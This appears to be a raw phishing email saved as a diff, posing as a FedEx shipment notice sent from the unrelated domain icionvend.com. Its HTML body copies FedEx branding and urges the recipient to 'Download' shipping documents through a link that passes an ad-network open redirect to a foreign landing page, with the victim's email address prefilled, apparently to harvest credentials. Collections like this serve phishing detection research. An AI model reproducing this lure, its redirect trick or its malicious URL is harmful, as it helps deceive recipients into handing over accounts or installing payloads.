@@ -1,0 +1,243 @@
+Return-Path: rhea@icionvend.com
+Delivered-To: jose@monkey.org
+X-FDA: 82842192174.18.AB69487
+Received: from frame.icionvend.com (frame.icionvend.com [194.169.172.143])
+	by imf29.b.hostedemail.com (Postfix) with ESMTP id 7FB25120003
+	for <jose@monkey.org>; Sat, 30 Nov 2024 09:11:08 +0000 (UTC)
+Authentication-Results: imf29.b.hostedemail.com;	dkim=pass
+ header.d=icionvend.com header.s=dkim header.b=BaDXlpx7;	dmarc=pass
+ (policy=none) header.from=icionvend.com;	spf=pass (imf29.b.hostedemail.com:
+ domain of rhea@icionvend.com designates 194.169.172.143 as permitted sender)
+ smtp.mailfrom=rhea@icionvend.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1732957868; a=rsa-sha256;
+	cv=none;
+	b=wkb+P+VXrxVnPzMJS8D+OGToXskN1q/S8xnaYHTdLOCzJIQxLSx+n7ecFvBkW76VHRM4lB
+	lLhnnYAvgrQNJVxqXat+mg/VGAmAofjp90jjsNFRIHpL12IupbdRXXP7cblynBq2owRq43
+	pTEgp6qiANeiT9xHJs2LJnDvQHL4bTc=
+ARC-Authentication-Results: i=1;	imf29.b.hostedemail.com;	dkim=pass
+ header.d=icionvend.com header.s=dkim header.b=BaDXlpx7;	dmarc=pass
+ (policy=none) header.from=icionvend.com;	spf=pass (imf29.b.hostedemail.com:
+ domain of rhea@icionvend.com designates 194.169.172.143 as permitted sender)
+ smtp.mailfrom=rhea@icionvend.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1732957868;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=66F8w7TQR9FCdbYhSVpld3Acx+BhFmHWREiUvqSXQNg=;
+	b=YATldHeleq/pm61uOSZFUoOnMsZda00dgXNSJip8ghJ4ZH5L/Tkq/98dQalEbqGIukVrS/
+	1azehH2RG8wK99GdEwaNIqAksY1lRDzieP5DdvSi/6Y62TtjsCZ6jZXA528+QXw+3gUOcF
+	QGcsZIw2CYp2cWui5eZOnlB24jewBXY=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=icionvend.com; 
+ =?utf-8?q?h=3DFrom=3ATo=3ASubject=3ADate=3AMessage-ID=3AMIME-Version=3ACont?=
+ =?utf-8?q?ent-Type=3AContent-Transfer-Encoding=3B?= i=rhea@icionvend.com;
+ bh=vYh+gJZYbP9uvrc0qpVvl2dNSW4=; =?utf-8?q?b=3DBaDXlpx76fK5zLsjrLTpCD3V9NL2?=
+ =?utf-8?q?Elfy6A7sOvgiqCiqzcU8z5Af2w67CcE9WwVcG/LB0wV2TIJD?=  
+ 7hHEzJi/GR1msFDlQoA1I2ggshV0wEXSLyevn8EosCFuE07e3M9JqxXr0mu2i3su34rLN3tDfAnZ
+  
+ tR+6Rk9uw3TpTOwVqiGV20DKuAd6zbXM1vS/djjIoJUKuNYrkGx1h7/s5j3aXyjJA3XTO1U0JYF0
+  
+ B7Il9lgjuV9g+l3/dqYDpbwxXNHEImEe+pMalRx9MeMTl74vKRSnxkfJoGHdG4Urx2InW2VDyWv4
+   F7x30TlkG0eFJepYjA/kAEM8YIYrQBkBZ9XYkw==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=icionvend.com; 
+ =?utf-8?q?b=3DPHCr7NN4Dl+Nov1hwQT5Tnhtyaow+QTNuV/3AkxxtVWNzNz30tRM4ypxdGgVL?=
+ =?utf-8?q?cIf8HCvOCCBnoOn?=  
+ 1t+JwrM0qVRekJhmb/KZCe6UvW9hwAY/JRbCzNNO1fS2UhxcSbwx4c+pLTcUdrlf9Z6IoTJKzJX5
+  
+ RjjKNCRi4O6S/kRP/+gcRrimKnQ2xqRyzLBggqHSq30id/hHXQRyAlpy2z02Av81TlANd5SjQiAB
+  
+ eiPD3TZdyCqucqCyd1QeerWSdrBnkC4w740pKA5nPd7kGcCOqCxe7HdYjPp87rUZQ7P0mKJxbRy1
+   cWvLIzk8wKe6Xg3eLVQoS/ua5pedmqFyTzQ2KQ==;
+From: "FedEX Express"<rhea@icionvend.com>
+To: jose@monkey.org
+Subject: RE: (FedEx) AWB NOTICE - ORIGINAL SHIPPING DOCUMENTS 128093287
+Date: 28 Nov 2024 19:50:23 +0000
+Message-ID: <20241128195022.2D11040C1926BC3C@icionvend.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=3.20
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: 7FB25120003
+X-Stat-Signature: ezaepqmzqz1efpn8x5mpcfnj8cnystpp
+X-Rspam-User: 
+X-HE-Tag: 1732957868-680200
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/2DG49IHjAQSvibVONeKT+Z4GNsmfoPKTKcIscIjHu0b6?=
+ =?utf-8?q?OgyQutlswzKVLho8PNHq8ri6fYEu2FnfdSxMZOvQlbRg2a90zEdYHOygUvjfz9BSl?=
+ =?utf-8?q?C73TTI3CWeRXJO/rOoMLExCxaBqOe4JbxGZUYs3zwTQAqWumx1HwBytmPEaJnfuA3?=
+ =?utf-8?q?HbIeFl/E5xERM/L6fptgG6t32A29V+enBsLPieYzCCSyWbiXFJ+auijfhiCCXIlQo?=
+ =?utf-8?q?vUxwwJ/Eo5QGowsBJFPBJ4Gh5OFovQP42+x2z1GhIWOwRv0QHmsV5SD2Tak8wxacU?=
+ =?utf-8?q?HRi8xONFDkuJwK8YUO1UeqTlTItmeJQE5TeJnictzzBB7nZagTw8wl/VNt6Y1fUV/?=
+ =?utf-8?q?qrFNSgcli+WpcPhmB/7EGFkIUAbBmpGUG0JM2pyffRirWSKR8FGSHgeW1AjUF8pWG?=
+ =?utf-8?q?oxVwY8nVWnZsgzqcJ6Y/oKCVZFw1Ulj39RnQd+rK4Anv8Y2NjFjgGTCP6k0+DXHMe?=
+ =?utf-8?q?e7LnbNfOd7CmL5zHkkEorG8nz210F2GgjNPAVSNpbT6vUuR42f13fhgg5G562kTWR?=
+ =?utf-8?q?j0+eVKf3o8h30FUm+1uuLIapiXifBWJrobPpJvjQICCnccnJdQ+V4RHov8gC6cq1E?=
+ =?utf-8?q?vUV28jqdsGKalJwSVV2scQqSEJLv+5ytZ0qvAkbPv0BawhxSQn8xx51yAUID9gZNH?=
+ =?utf-8?q?1u0yoxr7FREv+oZYFKmLeW/QviK5aCjWpDTGDJQkj3oJ0sWfWf2f4LHGtT6qCgM+a?=
+ =?utf-8?q?FQZdg3QsA2UO0eubY3KGdECenOGyjKBrURrFyYlI+QH55rJ+CcFaGFPz1K3bXFweu?=
+ =?utf-8?q?L6S/freIdcEHTKdSW437vjHQofZ2dyOwzxdSuIf9gBCAwHTiGgTihhilFy5L+FYds?=
+ =?utf-8?q?KV0rJ2K2kEqlG6Smx+xmfRz9F66wmt10G+XvGbQYq/Whk6GElQ2PGglIz+aYRS0J2?=
+ =?utf-8?q?Mj7kURNDAD0OkaT1je1AS/_+/HVfSRl3ag6QXDVS+g0ppGL88b+L/t+4omJYVGAcI?=
+ =?utf-8?q?KsWlNAh+vwTNiEGUr2RnjQY5D/Z9Za6Po7VtXtFiJWhXXxBmewIRrwPadxdTg0PDh?=
+ =?utf-8?q?EDSECC27xs1IJTMw=3D=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 369
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table width=3D"100%" align=3D"center" style=3D"color: rgb(34, 34, 34); tex=
+t-transform: none; letter-spacing: normal; font-family: Arial; font-size: s=
+mall; font-style: normal; font-weight: 400; word-spacing: 0px; white-space:=
+ normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-=
+variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-w=
+idth: 0px; text-decoration-style: initial; text-decoration-color: initial; =
+text-decoration-thickness: initial;" border=3D"0"=20
+cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"center" style=
+=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-s=
+erif;"><table width=3D"940" style=3D"width: 940px; max-width: 940px;" borde=
+r=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"center"=
+ style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Arial, =
+sans-serif;" bgcolor=3D"#4d148c"><table width=3D"100%" style=3D"min-width: =
+100%;" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr>
+<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
+l, sans-serif;"><table width=3D"100%" style=3D"min-width: 100%;" cellspacin=
+g=3D"0" cellpadding=3D"0"><tbody><tr><td style=3D"margin: 0px; font-family:=
+ Roboto, RobotoDraft, Helvetica, Arial, sans-serif;"><table width=3D"100%" =
+bgcolor=3D"#4d148c" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody=
+><tr><td align=3D"center" style=3D"margin: 0px; font-family: Roboto, Roboto=
+Draft, Helvetica, Arial, sans-serif;">
+<table width=3D"640" style=3D"width: 640px;" border=3D"0" cellspacing=3D"0"=
+ cellpadding=3D"0"><tbody><tr><td align=3D"center" valign=3D"middle" style=
+=3D"margin: 0px; padding: 20px; font-family: Roboto, RobotoDraft, Helvetica=
+, Arial, sans-serif;"><a style=3D"color: rgb(17, 85, 204); display: block;"=
+ href=3D"https://click.message.fedex.com/?qs=3D18d2211f490ccb5a826b565782bf=
+a032c0ebca50474b185df505bb5002255cffe9cfc6710e95718d2052639684350935150f933=
+c5b9ba9191b02bdcf08dd63da" target=3D"_blank" rel=3D"noreferrer">
+<img width=3D"150" height=3D"65" style=3D"border: 0px currentColor; border-=
+image: none; display: block;" alt=3D"FedEx Logistics" src=3D"https://ci5.go=
+ogleusercontent.com/proxy/p1ajgoB4OMHN4kDEq8wfFwZLpSI6m4EKIDxNXS7mvPjWaaEGK=
+bCkoXw2JgRCSUFON-cvYxaic2l5YT81ZrmyNR5eHcWbhaeFJIxmYB1ZPlstcUf29dUwphSEauD0=
+81JEnC6lo9KeSfXAYDw=3Ds0-d-e1-ft#https://image.message.fedex.com/lib/fe9213=
+72756d067475/m/3/fedex_logistics_logo_2021.png" border=3D"0"></a></td></tr>=
+</tbody></table></td></tr></tbody></table></td></tr></tbody>
+</table></td></tr></tbody></table></td></tr><tr><td align=3D"center" style=
+=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-s=
+erif;"><br></td></tr></tbody></table></td></tr></tbody></table>
+<table width=3D"100%" align=3D"center" style=3D"color: rgb(34, 34, 34); tex=
+t-transform: none; letter-spacing: normal; font-family: Arial; font-size: s=
+mall; font-style: normal; font-weight: 400; word-spacing: 0px; white-space:=
+ normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-=
+variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-w=
+idth: 0px; text-decoration-style: initial; text-decoration-color: initial; =
+text-decoration-thickness: initial;" bgcolor=3D"#ffffff"=20
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"ce=
+nter" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Ar=
+ial, sans-serif;"><table width=3D"640" style=3D"width: 640px;" border=3D"0"=
+ cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td width=3D"640" align=3D"=
+center" style=3D"margin: 0px; width: 640px; font-family: Roboto, RobotoDraf=
+t, Helvetica, Arial, sans-serif; min-width: 640px;"><table width=3D"100%" s=
+tyle=3D"min-width: 100%;" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr>
+<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
+l, sans-serif;"><table width=3D"640" style=3D"width: 640px;" border=3D"0" c=
+ellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"center" valign=
+=3D"top" style=3D"margin: 0px; padding: 15px 20px; font-family: Roboto, Rob=
+otoDraft, Helvetica, Arial, sans-serif;"><table width=3D"100%" border=3D"0"=
+ cellspacing=3D"0" cellpadding=3D"0"><tbody><tr>
+<td align=3D"left" valign=3D"top" style=3D"margin: 0px; color: rgb(88, 89, =
+91); line-height: 24px; font-family: Roboto, Arial, Helvetica, sans-serif; =
+font-size: 16px;">&nbsp;<br>Dear Valued Customer,<br><br><b><font size=3D"4=
+">You have a New Shipment Awaiting Your Confirmation.</font></b><br>
+<div style=3D"border-width: 0px; margin: 0px; padding: 0px; text-align: lef=
+t; color: rgb(34, 34, 34); text-transform: none; text-indent: 0px; letter-s=
+pacing: normal; font-family: Arial, Helvetica, sans-serif; font-style: norm=
+al; font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-sp=
+ace: normal; box-sizing: border-box; font-stretch: inherit; background-colo=
+r: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: n=
+ormal; text-decoration-style: initial;=20
+text-decoration-color: initial; font-variant-numeric: inherit; font-variant=
+-east-asian: inherit;"><font size=3D"4">Please&nbsp;<a href=3D"https://secu=
+re.adnxs.com/clktrb?id=3D83109&amp;redir=3Dhttps://candourtankers.ae/govfed=
+ex.html?email=3Djose@monkey.org">Download</a>
+ the <span style=3D"text-align: left; color: rgb(34, 34, 34); text-transfor=
+m: none; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helv=
+etica, sans-serif; font-size: large; font-style: normal; font-weight: 400; =
+word-spacing: 0px; float: none; display: inline !important; white-space: no=
+rmal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-var=
+iant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-widt=
+h: 0px; text-decoration-style: initial;=20
+text-decoration-color: initial; text-decoration-thickness: initial;">docume=
+nts</span> for Packing List, Commercial Invoice and Bill Of Lading.</font><=
+/div><br><br>
+<img width=3D"560" height=3D"320" align=3D"bottom" style=3D"border: 0px cur=
+rentColor; border-image: none;" src=3D"https://ci6.googleusercontent.com/pr=
+oxy/xa8smKNm3gmjB3WTgDi7fhyRwyRc_mvXTw-rQSQFTG4ckXe7j-zE4VVez7czJ1kKCby9RN_=
+0vV4c3lH8PvK-HWPU-GBQljmTVAGn6VXlXJboV7l0nPfBakVAH5abTU2H-Pmd37AR2A8AvRyBEr=
+PaTz4Dw556UIPHXI2Tg3k=3Ds0-d-e1-ft#https://assets1.progressivegrocer.com/fi=
+les/styles/content_sm/s3/2018-12/FedEx%20Package.jpg?itok=3DoFT62S1i" borde=
+r=3D"0" hspace=3D"0"></td></tr></tbody></table></td></tr></tbody>
+</table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbo=
+dy></table>
+<table width=3D"100%" align=3D"center" style=3D"color: rgb(34, 34, 34); tex=
+t-transform: none; letter-spacing: normal; font-family: Arial; font-size: s=
+mall; font-style: normal; font-weight: 400; word-spacing: 0px; white-space:=
+ normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-=
+variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-w=
+idth: 0px; text-decoration-style: initial; text-decoration-color: initial; =
+text-decoration-thickness: initial;" bgcolor=3D"#ffffff"=20
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"ce=
+nter" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Ar=
+ial, sans-serif;"><table width=3D"600" align=3D"center" style=3D"width: 600=
+px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td height=
+=3D"30" style=3D"margin: 0px; height: 30px; line-height: 1px; font-family: =
+Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 1px;"><br></t=
+d></tr><tr>
+<td height=3D"1" style=3D"margin: 0px; height: 1px; line-height: 1px; font-=
+family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 1px; =
+background-color: rgb(221, 221, 221);"><br></td></tr><tr><td height=3D"10" =
+style=3D"margin: 0px; height: 10px; line-height: 1px; font-family: Roboto, =
+RobotoDraft, Helvetica, Arial, sans-serif; font-size: 1px;"><br></td></tr><=
+/tbody></table></td></tr><tr><td align=3D"center" style=3D"margin: 0px; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;">
+<table width=3D"640" style=3D"width: 640px;" border=3D"0" cellspacing=3D"0"=
+ cellpadding=3D"0"><tbody><tr><td width=3D"640" align=3D"center" style=3D"m=
+argin: 0px; width: 640px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
+l, sans-serif; min-width: 640px;"><table width=3D"100%" style=3D"min-width:=
+ 100%;" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td style=3D"margin:=
+ 0px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;">
+<table width=3D"640" style=3D"width: 640px;" border=3D"0" cellspacing=3D"0"=
+ cellpadding=3D"0"><tbody><tr><td align=3D"center" valign=3D"top" style=3D"=
+margin: 0px; padding: 0px 20px 20px; font-family: Roboto, RobotoDraft, Helv=
+etica, Arial, sans-serif;"><table width=3D"100%" border=3D"0" cellspacing=
+=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"left" valign=3D"top" style=
+=3D"margin: 0px; color: rgb(88, 89, 91); line-height: 22px; font-family: Ro=
+boto, Arial, Helvetica, sans-serif; font-size: 14px;">
+<table width=3D"100%" style=3D"min-width: 100%;" cellspacing=3D"0" cellpadd=
+ing=3D"0"><tbody><tr><td style=3D"margin: 0px; font-family: Roboto, RobotoD=
+raft, Helvetica, Arial, sans-serif;"><table width=3D"100%" border=3D"0" cel=
+lspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"left" valign=3D"to=
+p" style=3D"margin: 0px; line-height: 22px; font-family: Roboto, Arial, Hel=
+vetica, sans-serif;">
+<img width=3D"17" height=3D"10" style=3D"border: 0px currentColor; border-i=
+mage: none; color: rgb(51, 51, 51); line-height: normal; font-size: 2px; di=
+splay: inline-block;" src=3D"https://ci3.googleusercontent.com/proxy/YwruSy=
+wVsc_eRqgZa81jm4SQdFoHokyM8V546e7kWkzutAr_bfYelP4m7kgR9ikCiZ1t77fhyIy9y4ZM0=
+sf1gWq7v7_AjdSYm8pJQDHHE39HZpkDX6F9lXZVysqbVLVP_Wlg9QP_mg=3Ds0-d-e1-ft#http=
+s://image.message.fedex.com/lib/fe921372756d067475/m/3/socialIcon_email_FY2=
+2.png" border=3D"0">
+&nbsp;This email has been sent to: mbills@hmishred.com<br><br>&copy; 2024 F=
+edEx. The content of this message is protected by copyright and trademark l=
+aws under U.S. and international law. Review our&nbsp;&nbsp;<a style=3D"col=
+or: rgb(51, 51, 51);" href=3D"https://click.message.fedex.com/?qs=3De046b57=
+d5a056329638df2ec67401fc2cc71e84954a967d70564c81096370f5afd97c30668d2d03c54=
+32d4475bdef91b578a2cc647ba2f69438dbaa5ea127434" target=3D"_blank" rel=3D"no=
+referrer">privacy policy</a>. All rights reserved.</td></tr>
+</tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></=
+tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td=
+></tr></tbody></table></body></html>
+
